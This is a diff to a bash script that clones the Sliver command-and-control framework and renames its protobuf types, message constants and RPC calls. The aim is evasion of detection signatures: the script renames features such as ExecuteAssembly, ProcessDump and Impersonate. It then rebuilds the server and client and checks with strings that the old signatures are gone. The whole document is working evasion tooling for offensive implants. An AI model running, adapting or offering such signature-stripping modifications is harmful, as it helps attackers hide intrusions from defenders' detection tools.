@@ -1,5 +1,5 @@
 #!/bin/bash
-# Complete Sliver Protobuf Modification Script.
+# Complete Sliver Protobuf Modification Script
 # Clones Sliver and modifies protobuf signatures for evasion
 
 set -e
@@ -55,7 +55,7 @@ fi
 echo ""
 echo "[*] Step 1: Modifying protobuf definitions..."
 
-# Define renaming mappings
+# Define renaming mappings - INCLUDING ExecuteAssembly and ExecuteWindows
 declare -A PROTO_RENAMES=(
     ["ScreenshotReq"]="SysScreenCaptureReq"
     ["Screenshot"]="SysScreenCapture"
@@ -81,6 +81,10 @@ declare -A PROTO_RENAMES=(
     ["Rm"]="FileRemove"
     ["ExecuteReq"]="CmdExecuteReq"
     ["Execute"]="CmdExecute"
+    ["ExecuteAssemblyReq"]="CmdExecuteAssemblyReq"
+    ["ExecuteAssembly"]="CmdExecuteAssembly"
+    ["ExecuteWindowsReq"]="CmdExecuteWindowsReq"
+    ["ExecuteWindows"]="CmdExecuteWindows"
     ["UploadReq"]="FileUploadReq"
     ["Upload"]="FileUpload"
     ["DownloadReq"]="FileDownloadReq"
@@ -126,13 +130,47 @@ for OLD in "${!PROTO_RENAMES[@]}"; do
         -e "s/&clientpb\.${OLD}/\&clientpb.${NEW}/g" \
         -e "s/rpcpb\.${OLD}/rpcpb.${NEW}/g" \
         -e "s/case \*${OLD}:/case \*${NEW}:/g" \
-        -e "s/MsgImpersonateReq/MsgSysTokenSwitchReq/g" \
-        -e "s/MsgImpersonate:/MsgSysTokenSwitch:/g" \
         {}
 done
 
+# Special handling for message type constants
+echo "  [+] Updating message type constants..."
+echo "$FILES" | xargs -I {} sed -i \
+    -e "s/MsgImpersonateReq/MsgSysTokenSwitchReq/g" \
+    -e "s/MsgImpersonate/MsgSysTokenSwitch/g" \
+    -e "s/MsgExecuteReq/MsgCmdExecuteReq/g" \
+    -e "s/MsgExecute:/MsgCmdExecute:/g" \
+    -e "s/MsgPsReq/MsgSysProcListReq/g" \
+    -e "s/MsgPs:/MsgSysProcList:/g" \
+    {}
+
 echo ""
-echo "[*] Step 4: Fixing CLI framework methods..."
+echo "[*] Step 4: Updating RPC client method calls..."
+
+# Update RPC method calls: con.Rpc.Execute() -> con.Rpc.CmdExecute()
+echo "  [+] Updating RPC method calls..."
+echo "$FILES" | xargs -I {} sed -i \
+    -e 's/\.Rpc\.Execute(/\.Rpc.CmdExecute(/g' \
+    -e 's/\.Rpc\.ExecuteAssembly(/\.Rpc.CmdExecuteAssembly(/g' \
+    -e 's/\.Rpc\.ExecuteWindows(/\.Rpc.CmdExecuteWindows(/g' \
+    -e 's/\.Rpc\.Upload(/\.Rpc.FileUpload(/g' \
+    -e 's/\.Rpc\.Download(/\.Rpc.FileDownload(/g' \
+    -e 's/\.Rpc\.Ls(/\.Rpc.FileDirList(/g' \
+    -e 's/\.Rpc\.Cd(/\.Rpc.FileDirChange(/g' \
+    -e 's/\.Rpc\.Pwd(/\.Rpc.FileCurrentDir(/g' \
+    -e 's/\.Rpc\.Mkdir(/\.Rpc.FileMakeDir(/g' \
+    -e 's/\.Rpc\.Rm(/\.Rpc.FileRemove(/g' \
+    -e 's/\.Rpc\.Ps(/\.Rpc.SysProcList(/g' \
+    -e 's/\.Rpc\.Ifconfig(/\.Rpc.SysNetConfig(/g' \
+    -e 's/\.Rpc\.Netstat(/\.Rpc.SysConnList(/g' \
+    -e 's/\.Rpc\.ProcessDump(/\.Rpc.SysMemDump(/g' \
+    -e 's/\.Rpc\.Screenshot(/\.Rpc.SysScreenCapture(/g' \
+    -e 's/\.Rpc\.Impersonate(/\.Rpc.SysTokenSwitch(/g' \
+    -e 's/\.Rpc\.Migrate(/\.Rpc.ProcMigrate(/g' \
+    {}
+
+echo ""
+echo "[*] Step 5: Fixing CLI framework methods..."
 
 # Fix CLI Execute methods that should NOT have been renamed
 echo "  [+] Restoring CLI framework Execute() methods..."
@@ -151,7 +189,7 @@ echo "$FILES" | xargs -I {} sed -i \
     {}
 
 echo ""
-echo "[*] Step 5: Restoring standard library calls..."
+echo "[*] Step 6: Restoring standard library calls..."
 
 # CRITICAL: Restore any standard library calls that got renamed
 echo "  [+] Restoring os.* and filepath.* calls..."
@@ -160,6 +198,7 @@ echo "$FILES" | xargs -I {} sed -i \
     -e 's/os\.FileRemove/os.Remove/g' \
     -e 's/os\.FileUpload/os.Upload/g' \
     -e 's/os\.FileDownload/os.Download/g' \
+    -e 's/os\.FileDirList/os.ReadDir/g' \
     -e 's/filepath\.FileMakeDir/filepath.Mkdir/g' \
     -e 's/filepath\.FileRemove/filepath.Remove/g' \
     {}
@@ -173,7 +212,7 @@ echo "$FILES" | xargs -I {} sed -i \
     {}
 
 echo ""
-echo "[*] Step 6: Compiling Sliver..."
+echo "[*] Step 7: Compiling Sliver..."
 echo ""
 
 if make; then
@@ -186,6 +225,14 @@ if make; then
     echo ""
     echo "Binaries:"
     ls -lh sliver-server sliver-client 2>/dev/null
+    echo ""
+    echo "Verify modifications:"
+    echo "  cd $INSTALL_DIR"
+    if strings sliver-server | grep -q "\.sliverpb\.ScreenshotReq\|\.sliverpb\.ProcessDumpReq\|\.sliverpb\.ImpersonateReq"; then
+        echo "  ❌ WARNING: Old signatures still present"
+    else
+        echo "  ✅ Protobuf signatures successfully modified"
+    fi
     echo ""
     echo "Start Sliver:"
     echo "  cd $INSTALL_DIR"
